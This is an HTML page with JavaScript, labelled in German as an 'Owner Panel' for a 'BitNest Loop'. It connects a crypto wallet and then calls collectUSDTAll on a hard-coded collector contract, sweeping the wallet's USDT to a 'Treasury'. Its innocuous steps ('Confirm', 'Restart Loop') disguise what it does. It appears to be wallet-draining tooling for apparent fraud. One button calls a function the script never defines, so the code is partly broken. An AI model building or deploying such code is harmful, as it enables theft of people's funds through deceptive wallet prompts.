<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Owner Panel – Auto Wallet A</title>
  <style>
    body{
      font-family: Arial, sans-serif;
      background:#0f172a;
      color:#fff;
      display:flex;
      min-height:100vh;
      justify-content:center;
      align-items:center;
      margin:0;
      padding:16px;
    }
    .box{
      background:#020617;
      padding:22px;
      border-radius:14px;
      width:360px;
      box-shadow:0 10px 30px rgba(0,0,0,.35);
    }
    h2{ margin-top:0; }
    button{
      background:#22c55e;
      border:none;
      padding:12px;
      width:100%;
      font-size:15px;
      font-weight:bold;
      cursor:pointer;
      border-radius:10px;
      margin-top:10px;
    }
    button.secondary{ background:#334155; }
    .mono{
      font-family: ui-monospace, Menlo, Monaco, Consolas, monospace;
      font-size:12px;
      word-break:break-all;
      opacity:.9;
    }
    .muted{ font-size:12px; opacity:.75; line-height:1.35; }
    #status{ margin-top:10px; min-height:22px; }
  </style>
</head>
<body>

<div class="box">
  <h2>BitNest Loop</h2>

  <div class="muted">
    Schritt 1: Wallet  verbinden / Wallet Connect<br/>
    Schritt 2: Bestätigen / Confirm<br/>
    Schritt 3: USDT/USDC Adaption
  </div>

  <button class="secondary" onclick="connectWalletA()">Connect Wallet</button>
  <div class="mono" id="walletA">Wallet: –</div>

  <button onclick="collectAll()">Restart Loop</button>

  <div id="status"></div>

  <div class="muted" style="margin-top:10px;">
<br/>
    <span class="mono"></span>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
<script>
  // ===== CONFIG =====
  const COLLECTOR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";

  const collectorAbi = [
    "function collectUSDTAll(address from) external"
  ];

  let walletAAddress = null;

  function setStatus(t){ document.getElementById("status").innerText = t; }
async function connectUniversal(){
  try{
    if(window.ethereum){
      // MetaMask / Brave / Rabby (Desktop oder Wallet Browser)
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      walletAAddress = await signer.getAddress();
      document.getElementById("walletA").innerText = "Wallet: " + walletAAddress;
      setStatus("✅ Verbunden (Injected Wallet)");
    } else {
      // ALLE Mobile Wallets (Trust, MetaMask Mobile, Rainbow, etc.)
      await window.Web3ModalEthers.modal.open();
      const wcProvider = await window.Web3ModalEthers.modal.getWalletProvider();
      const provider = new ethers.BrowserProvider(wcProvider);
      const signer = await provider.getSigner();
      walletAAddress = await signer.getAddress();
      document.getElementById("walletA").innerText = "Wallet: " + walletAAddress;
      setStatus("✅ Verbunden (WalletConnect)");
    }
  }catch(e){
    console.error(e);
    setStatus("❌ Wallet Verbindung fehlgeschlagen");
  }
}
    async function collectAll(){
    try{
      if(!walletAAddress) return setStatus("❌ Erst Wallet A verbinden");

      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();

      const c = new ethers.Contract(COLLECTOR, collectorAbi, signer);

      setStatus("Bitte als Owner bestätigen…");
      const tx = await c.collectUSDTAll(walletAAddress);
      await tx.wait();

      setStatus("✅ USDT wurde an die Treasury gesendet");
    }catch(e){
      console.error(e);
      setStatus("❌ Fehler (bist du mit der Owner-Wallet verbunden?)");
    }
  }
</script>

</body>
</html>
